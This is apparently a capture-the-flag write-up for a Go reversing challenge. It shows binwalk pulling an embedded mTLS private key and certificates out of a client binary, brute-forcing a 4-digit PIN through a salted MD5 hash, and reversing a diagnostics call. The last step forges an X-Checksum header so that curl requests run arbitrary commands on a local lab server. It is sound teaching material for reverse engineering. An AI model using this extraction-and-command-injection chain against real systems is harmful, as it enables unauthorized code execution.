# Solution

This is a Go reversing challenge with no obfuscation or anti debugging implemented. When the binary is run, we are prompted for a 4-digit PIN, after which an MTLS connection to the server is made:
```sh
$ ./out 
[!] Authorized users only [!]
Enter 4-digit PIN: 1234
UNAUTHORIZED
```

![wireshark-trace](./wstrace.png)

## Extracting the certificates

If we try to contact the server, we will get a `bad certificate` error:
```sh
$ curl https://127.0.0.1:8443 -k
curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0
```

Since `out` client binary is communicating successfully with the server, this implies that the client certificate is most certainly embedded in it.

Simple `strings` on the binary hints that this is true, but does not give results in extracting the key or the certificate:
```sh
$ strings out | grep BEGIN
-----BEGIN 
$ strings out | grep MII
$ 
```

The quickest way to extract embedded data (without reversing its memory location and how it is embedded, whether it is compressed or encoded, etc.) is to use `binwalk`:
```
$ binwalk -e -q out

WARNING: Extractor.execute failed to run external extractor 'unrar e '%e'': [Errno 2] No such file or directory: 'unrar', 'unrar e '%e'' might not be installed correctly

WARNING: Extractor.execute failed to run external extractor 'unrar -x '%e'': [Errno 2] No such file or directory: 'unrar', 'unrar -x '%e'' might not be installed correctly
$ ls -al _out.extracted/
total 4436
drwxrwxr-x  2 vm   vm      4096 stu  28 17:03 .
drwxrwxrwt 25 root root    4096 stu  28 17:03 ..
-rw-rw-r--  1 vm   vm   2260125 stu  28 17:03 4172A8.gz
-rw-rw-r--  1 vm   vm   2259469 stu  28 17:03 417538.rar
-rw-rw-r--  1 vm   vm       288 stu  28 17:03 41EA60
-rw-rw-r--  1 vm   vm       648 stu  28 17:03 4209C0
-rw-rw-r--  1 vm   vm       794 stu  28 17:03 421B60
$ cat _out.extracted/41EA60 
-----BEGIN EC PRIVATE KEY-----
MIGkAgEBBDD4wMu+lWw1vxYfR6mUOxBd/LhoX2sgguVFrk7cgr508Nosj364BnOW
OB0demlpD7KgBwYFK4EEACKhZANiAAQSHynWUs9NBKIkD+YPQJAOmny3Ha2JHYgI
emkutdl1LP2m3kLyxvvNf/Zt/t4MOyIfeRDYgLY6uxl+29gxYdIVzV7QmYR823OZ
fLnS4IL3QLbGmLRbo7QrzZXJAtwupsQ=
-----END EC PRIVATE KEY-----
$ cat _out.extracted/4209C0 
-----BEGIN CERTIFICATE-----
MIIBsTCCATYCAgPoMAoGCCqGSM49BAMCMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQI
DApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQw
HhcNMjExMTI4MTUyMzM3WhcNMjIxMTI4MTUyMzM3WjBFMQswCQYDVQQGEwJBVTET
MBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQ
dHkgTHRkMHYwEAYHKoZIzj0CAQYFK4EEACIDYgAEEh8p1lLPTQSiJA/mD0CQDpp8
tx2tiR2ICHppLrXZdSz9pt5C8sb7zX/2bf7eDDsiH3kQ2IC2OrsZftvYMWHSFc1e
0JmEfNtzmXy50uCC90C2xpi0W6O0K82VyQLcLqbEMAoGCCqGSM49BAMCA2kAMGYC
MQCkVh/9hIiKhk+JMhMlwHxrOlsm42LsxienEiIzXP3yPjuyI5lZJKFVHd89bJm2
tx4CMQDi2fqgClW7euwTJs+NSNJIyJVUm/XUhtG0GF6Q1mG+HcXAWeLHTm3VKB5O
E5PZOW8=
-----END CERTIFICATE-----
$ cat _out.extracted/421B60 
-----BEGIN CERTIFICATE-----
MIICHDCCAaKgAwIBAgIUQpCQ+UGIfzsi1vQdOkb+xWvMBPEwCgYIKoZIzj0EAwIw
RTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGElu
dGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMTExMjgxNTIyMzFaFw0yMjExMjgx
NTIyMzFaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYD
VQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwdjAQBgcqhkjOPQIBBgUrgQQA
IgNiAAQydWgSWE8B0MrsJLKDlYyJEzI+Y/+o8sflRD6U2SYixFwljGufT8DzIAdp
RJ3QC5zeY+fsJY0MZC/0FCLv2jp7XelcsAJxYoUa9TnjhcFCn5PZnndBgprNQHPh
fCapzMajUzBRMB0GA1UdDgQWBBRTV5FxmMUmwwodZ6zwL0edN3MYtTAfBgNVHSME
GDAWgBRTV5FxmMUmwwodZ6zwL0edN3MYtTAPBgNVHRMBAf8EBTADAQH/MAoGCCqG
SM49BAMCA2gAMGUCMET6OLckymhWmnXuTnv1kZoiRF9CoTBNMSGiC0eTonFF1nu2
jgSoZW1RZoMD1HTPXgIxAPGoASv6jAC9XzpZHETTtKSMhaYOKW0GCxDs11MfWZl4
7rQbYfEIUblM8jYr+G1t4g==
-----END CERTIFICATE-----
```

Great! Now we can communicate with the remote server if it proves useful at a later stage:
```sh
$ curl --key 41EA60 --cert 4209C0 -i https://127.0.0.1:8443/ -k
HTTP/2 404 
content-type: text/plain; charset=utf-8
x-content-type-options: nosniff
content-length: 19
date: Sun, 28 Nov 2021 16:06:59 GMT

404 page not found
```

Note that there are also other ways to extract certificates and key such as during debug mode.

## Getting remote endpoints from binary

The easiest way to extract live endpoints from the client binary without perfoming any reversing is by using `strings`:
```sh
$ strings out | grep https://
...
2: response body closedhttps://127.0.0.1:8443/diaghttps://127.0.0.1:8443/initinsufficient security level
...
```

These can be also found when reversing the binary (see an example below in the `main.diagnostics` function call disassembly).

The found endpoints can be easily verified with `curl`:
```sh
$ curl --key 41EA60 --cert 4209C0 -i https://127.0.0.1:8443/diag -k
HTTP/2 400 
content-type: text/plain
content-length: 11
date: Sun, 28 Nov 2021 16:23:29 GMT

Bad request
$ curl --key 41EA60 --cert 4209C0 -i https://127.0.0.1:8443/init -k
HTTP/2 200 
content-type: text/plain
content-length: 65
date: Sun, 28 Nov 2021 16:23:33 GMT

7e03b4d1dc386512d7436f00b2582d22|03a82cd17eff82931da316553e3e190c
```

Hm... two hexadecimal strings?

## Bruteforcing the PIN

Since binary mentions that the PIN is a 4-digit number. We can easily bruteforce the PIN:
```sh
$ python3 brute.py
PIN: b'6583'
^CTraceback (most recent call last):
  File "brute.py", line 7, in <module>
    out, err = process.communicate(input=pin)
  File "/usr/lib/python3.8/subprocess.py", line 1028, in communicate
    stdout, stderr = self._communicate(input, endtime, timeout)
  File "/usr/lib/python3.8/subprocess.py", line 1868, in _communicate
    ready = selector.select(timeout)
  File "/usr/lib/python3.8/selectors.py", line 415, in select
    fd_event_list = self._selector.poll(timeout)
KeyboardInterrupt

```

You can find the bruteforce script attached. It takes around 10 minutes to get the correct PIN (YMMV). Note that there are also other ways to bruteforce the PIN such as reversing what the binary does and then bruteforcing the found hexadecimal strings against the PIN. The hexadecimal strings provided by `/init` URL are the PIN hash and hash salt respectively.
```python
>>> pinhash
'7e03b4d1dc386512d7436f00b2582d22'
>>> salt
'03a82cd17eff82931da316553e3e190c'
>>> from itertools import product
>>> from hashlib import md5
>>> import string
>>> for i in product(string.digits, repeat=4):
...     i = ''.join(i)
...     if md5(str.encode(i+":"+salt)).hexdigest() == pinhash:
...             print(i)
... 
6583
```

## Performing diagnostics call

To see what the diagnostics call is doing, we have to reverse the parameters of `main.diagnostics` function.

In the disassembly, we can see parameters being loaded:
```
        006104b4 48 8b 44        MOV        RAX,qword ptr [RSP + local_e0]
                 24 70
        006104b9 48 8d 1d        LEA        RBX,[DAT_00675e3e]
                 7e 59 06 00
        006104c0 b9 09 00        MOV        ECX,0x9
                 00 00
        006104c5 48 8d 3d        LEA        RDI,[DAT_0067c095]
                 c9 bb 06 00
        006104cc be 1b 00        MOV        ESI,0x1b
                 00 00
        006104d1 4c 8b 44        MOV        R8,qword ptr [RSP + local_e8]
                 24 68
        006104d6 4c 8b 4c        MOV        R9,qword ptr [RSP + local_110]
                 24 40
        006104db 0f 1f 44        NOP        dword ptr [RAX + RAX*0x1]
                 00 00
        006104e0 e8 3b f7        CALL       main.diagnostics
                 ff ff
```

Parameters loaded in registers (read from different places in assembly):
```
- rdi: "https://127.0.0.1/diag"
- rsi: 0x1b (size of rdi content)
- rdx: 0x0 
- rcx: 0x09 (size of rbx content)
-  r8: user input (PIN), identified by rsp+local_e8, loaded by rax after runtime.slicebytetostring at 0x006102b2
-  r9: 0x04 (size of user input PIN)

- rbx: "/bin/true"
```

When call to `main.diagnostics` function is performed, registers are dumped to the stack:
```
        0060fc49 48 89 8c        MOV        qword ptr [RSP + Stack[0x18]],bin_true_size
                 24 a0 02 
                 00 00
        0060fc51 48 89 9c        MOV        qword ptr [RSP + Stack[0x10]],RBX  ; holds /bin/true
                 24 98 02 
                 00 00
        0060fc59 48 89 bc        MOV        qword ptr [RSP + Stack[0x20]],URL
                 24 a8 02 
                 00 00
        0060fc61 4c 89 8c        MOV        qword ptr [RSP + Stack[0x38]],PIN_size
                 24 c0 02 
                 00 00
        0060fc69 4c 89 84        MOV        qword ptr [RSP + Stack[0x30]],PIN
                 24 b8 02 
                 00 00
        0060fc71 48 89 b4        MOV        qword ptr [RSP + Stack[0x28]],URL_size
                 24 b0 02 
                 00 00
```

In a later call, these variables are a bit shuffled and names might not fit (in Go, the stack is the source of truth). The most interesting call in the `main.diagnostics` function is the call to `runtime.concatstring3` which is followed by an `md5.Sum` function call:
```
        0060fd90 48 8b 9c        MOV        RBX,qword ptr [RSP + Stack[0x10]]
                 24 98 02 
                 00 00
        0060fd98 48 8b 8c        MOV        bin_true_size,qword ptr [RSP + Stack[0x18]]
                 24 a0 02 
                 00 00
        0060fda0 48 8d 3d        LEA        URL,[DAT_006745cb]    = 3Ah    :
                 24 48 06 00
        0060fda7 be 01 00        MOV        URL_size,0x1
                 00 00
        0060fdac 4c 8b 84        MOV        PIN,qword ptr [RSP + Stack[0x30]]
                 24 b8 02 
                 00 00
        0060fdb4 4c 8b 8c        MOV        PIN_size,qword ptr [RSP + Stack[0x38]]
                 24 c0 02 
                 00 00
        0060fdbc 0f 1f 40 00     NOP        dword ptr [RAX]
        0060fdc0 e8 1b e7        CALL       runtime.concatstring3
                 e3 ff
        0060fdc5 48 89 d9        MOV        bin_true_size,RBX
        0060fdc8 48 89 c3        MOV        RBX,RAX
        0060fdcb 48 8d 84        LEA        RAX=>local_208,[RSP + 0x80]
                 24 80 00 
                 00 00
        0060fdd3 e8 c8 eb        CALL       runtime.stringtoslicebyte
                 e3 ff
        0060fdd8 e8 63 2e        CALL       crypto/md5.Sum
                 e8 ff
```

What happens here is: `"/bin/true"` string is loaded to `rbx` register which is used as source string for `runtime.concatstring3`. In our variables (registers), the following values are loaded afterwards:
```
- URL/rdi = ":"
- URL_size/rsi = 0x1
- PIN/r8 = "6583" (pin)
- PIN_size/r9 = 0x4
```

These values are then concatenated together by the `runtime.concatstring3` function and saved in the `rax` register as a result. The final result can also be read in a debugger:
```
(gdb) x/i $rip
=> 0x60fdc5 <main.diagnostics+421>:	mov    rcx,rbx
(gdb) x/s $rax
0xc000139bf8:	"/bin/true:6583"
```

Later, the `rax` result is moved to `rbx` and used in the following function calls: `runtime.stringtoslicebyte`, `crypto/md5.Sum`, `runtime.makeslice` and `encoding/hex.Encode`. The expected final result is a hex encoded MD5 checksum of our `/bin/true:6583` string:
```
   0x60fdfb <main.diagnostics+475>:	mov    QWORD PTR [rsp+0xd8],rax
   0x60fe03 <main.diagnostics+483>:	mov    ebx,0x20
   0x60fe08 <main.diagnostics+488>:	mov    rcx,rbx
   0x60fe0b <main.diagnostics+491>:	lea    rdi,[rsp+0x50]
   0x60fe10 <main.diagnostics+496>:	mov    esi,0x10
   0x60fe15 <main.diagnostics+501>:	mov    r8,rsi
   0x60fe18 <main.diagnostics+504>:	call   0x52eee0 <encoding/hex.Encode>
   0x60fe1d <main.diagnostics+509>:	xor    eax,eax
   0x60fe1f <main.diagnostics+511>:	mov    rbx,QWORD PTR [rsp+0xd8]
=> 0x60fe27 <main.diagnostics+519>:	mov    ecx,0x20
(gdb) x/gx $rsp+0xd8
0xc00012bc70:	0x000000c0001c6060
(gdb) x/s 0x000000c0001c6060
0xc0001c6060:	"4cf882453385fb11175029b4332d1542"
```

Given result can be easily verified:
```sh
$ echo -ne '/bin/true:6583' | md5sum
4cf882453385fb11175029b4332d1542  -
```

Good! Next step is to uncover what is happening with that checksum exactly. Our next call of significance happens at `0x0060fe46` - `net/url.Values.Encode`. To shorten the analysis, we observe that the result of that call in a debugger is:
```
   0x60fe39 <main.diagnostics+537>:	mov    QWORD PTR [rsp+0x40],rbx
   0x60fe3e <main.diagnostics+542>:	lea    rax,[rsp+0x100]
=> 0x60fe46 <main.diagnostics+550>:	call   0x55e9e0 <net/url.Values.Encode>
   0x60fe4b <main.diagnostics+555>:	mov    QWORD PTR [rsp+0xa8],rax
(gdb) nexti
0x000000000060fe4b in main.diagnostics ()
(gdb) x/s $rax
0xc000096040:	"c=%2Fbin%2Ftrue"
```

This suggests that a URL encoded value is being passed as part of an HTTP request. The creation of an HTTP request happens later, at `0x0060fed8`, where `net/http.NewRequestWithContext` call is executed. We check its parameters:
```
        0060fea4 48 8b 1d        MOV        RBX,qword ptr [context.background]
                 8d 99 25 00
        0060feab 48 8d 0d        LEA        bin_true_size,[s_POSTThaiTypeUumlYumlZeta_m=]_   = POST
                 d8 4c 06 00
        0060feb2 bf 04 00        MOV        URL,0x4
                 00 00
        0060feb7 48 8b b4        MOV        URL_size,qword ptr [RSP + Stack[0x20]]
                 24 a8 02 
                 00 00
        0060febf 4c 8b 84        MOV        PIN,qword ptr [RSP + Stack[0x28]]
                 24 b0 02 
                 00 00
        0060fec7 4c 8d 0d        LEA        PIN_size,[go.itab.*strings.Reader,io.Reader]
                 92 e4 0b 00
        0060fece 49 89 c2        MOV        R10,RAX
        0060fed1 48 8d 05        LEA        RAX,[go.itab.*context.emptyCtx,context.Context]
                 58 3d 0c 00
        0060fed8 e8 a3 89        CALL       net/http.NewRequestWithContext
                 fd ff
```

The loaded parameters are:
```
- rsi: URL (https://127.0.0.1:8443/diag)
- rcx: "POST" (http method?)
- rdi: 0x4 (size of "POST"?)
-  r8: 0x1b (size of URL)
```

This creates our HTTP request, which is further enriched at `0x0060ff24` with a `runtime.mapassign_faststr` since the return address of the `http.NewRequestWithContext` call is used as parameter for the `runtime.mapassign_faststr` function (`[rsp+0xc0]` is used for storing the result after request creation and later again referenced when setting up parameters before the `mapassign_faststr` call).

Let's check its parameters:
```
(gdb) x/12i 0x60fefd
   0x60fefd <main.diagnostics+733>:	nop
   0x60fefe <main.diagnostics+734>:	mov    ebx,0xa
   0x60ff03 <main.diagnostics+739>:	lea    rax,[rip+0x665e5]        # 0x6764ef
   0x60ff0a <main.diagnostics+746>:	call   0x5af180 <net/textproto.CanonicalMIMEHeaderKey>
   0x60ff0f <main.diagnostics+751>:	mov    rcx,rax
   0x60ff12 <main.diagnostics+754>:	mov    rdi,rbx
   0x60ff15 <main.diagnostics+757>:	lea    rax,[rip+0x47a04]        # 0x657920
   0x60ff1c <main.diagnostics+764>:	mov    rbx,QWORD PTR [rsp+0xc0]
   0x60ff24 <main.diagnostics+772>:	call   0x413d00 <runtime.mapassign_faststr>
   0x60ff29 <main.diagnostics+777>:	mov    rcx,QWORD PTR [rax+0x8]
   0x60ff2d <main.diagnostics+781>:	mov    rbx,QWORD PTR [rax]
   0x60ff30 <main.diagnostics+784>:	mov    rdi,QWORD PTR [rax+0x10]
(gdb) x/s 0x6764ef
0x6764ef:	"X-Checksum
```

A similar set of calls is also happening later at `0x0060ffcc`, but different content is loaded:
```
(gdb) x/s 0x676cdf
0x676cdf:	"Content-Type...
```

These fixed strings suggest a lot that HTTP headers are being loaded: `Content-Type` and `X-Checksum` header. Few instructions later, the `Content-Type` header values are being revealed (at `0x610076` instruction address):
```
(gdb) x/s 0x67e704
0x67e704:	"application/x-www-form-urlencoded...
```

The only significant call below is the `net/http.(*Client).do`, suggesting that HTTP request is sent to the server. Let's try to mock our own request to see if it works. Remember, we need `Content-Type` header, `X-Checksum` header, the `c=/bin/true` URL encoded payload and it has to be HTTP POST:
```sh
$ curl --key 41EA60 --cert 4209C0 -i https://127.0.0.1:8443/diag -k -H "Content-Type: application/x-www-form-urlencoded" -H "X-Checksum: 4cf882453385fb11175029b4332d1542" --data "c=/bin/true"
HTTP/2 200 
content-type: text/plain
content-length: 0
date: Sun, 28 Nov 2021 19:31:54 GMT

$ curl --key 41EA60 --cert 4209C0 -i https://127.0.0.1:8443/diag -k -H "Content-Type: application/x-www-form-urlencoded" -H "X-Checksum: 0000" --data "c=/bin/true"
HTTP/2 401 
content-type: text/plain
content-length: 12
date: Sun, 28 Nov 2021 19:33:31 GMT

Unauthorized
```

## Calculating the checksum and owning server

The server obviously runs binaries that are requested by client. This means that we can execute any command on the server, we just need to follow the same implementation and calculate the command checksum properly.


In order to calculate the checksum in a shell script:
```sh
$ echo -ne "/bin/cat ./flag.txt:6583" | md5sum
c2f935d5c5868f46adf25a3b16cf8cf7  -
```

And we get the flag:
```sh
$ curl --key 41EA60 --cert 4209C0 -i https://127.0.0.1:8443/diag -k -H "Content-Type: application/x-www-form-urlencoded" -H "X-Checksum: c2f935d5c5868f46adf25a3b16cf8cf7" --data "c=/bin/cat ./flag.txt"
HTTP/2 200 
content-type: text/plain
content-length: 56
date: Sun, 28 Nov 2021 19:35:11 GMT

ibctf{sq333z3-m3_t1ght_1-g0t-3nterpr1s3-if_y0u_n33d_IT}
```
